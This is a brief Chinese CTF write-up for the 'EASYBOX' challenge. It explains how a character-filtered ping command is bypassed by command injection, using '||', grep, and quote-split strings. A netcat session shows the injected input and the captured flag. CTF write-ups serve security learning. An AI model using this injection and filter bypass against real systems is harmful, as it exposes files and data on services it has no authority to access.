# EASYBOX

From CBCTF x DASCTF

## 文件分析

下载`easybox`, NX on, PIE off, Canary on, RELRO partial  
ghidra分析为64位程序

## 逆向

pingCommand虽然ban了很多字符，但是我们仍可以通过拼接字符串来绕过sh, cat和flag

通过||操作符忽略错误继续执行；  
先ls /bin看看有什么可以利用的程序，发现有grep；  
grep同样可以打印文件；  
"fl""ag"可以把flag拼起来；  
最后用catCommand查看`result.txt`就可以了

## EXPLOIT

```
nc node4.buuoj.cn 26927
 _____    _    ______   ______   _____  __
| ____|  / \  / ___\ \ / / __ ) / _ \ \/ /
|  _|   / _ \ \___ \\ V /|  _ \| | | \  /
| |___ / ___ \ ___) || | | |_) | |_| /  \
|_____/_/   \_\____/ |_| |____/ \___/_/\_\
Canary value saved to canary.txt.
Welcome to the EASYBOX
Please enter your name: yes
Hello! yes
yes@EASYBOX:/home/ctf$ PING
Enter an IP address: ||grep -i f "fl""ag"
sh: 1: ping: not found
Ping result has been saved in /tmp/result.txt
yes@EASYBOX:/home/ctf$ CAT
Enter the filename to view: result.txt
DASCTF{faf97940-0fc1-40af-a539-2ac02898e155}

yes@EASYBOX:/home/ctf$ EXIT
Exiting the program...
```

Done.
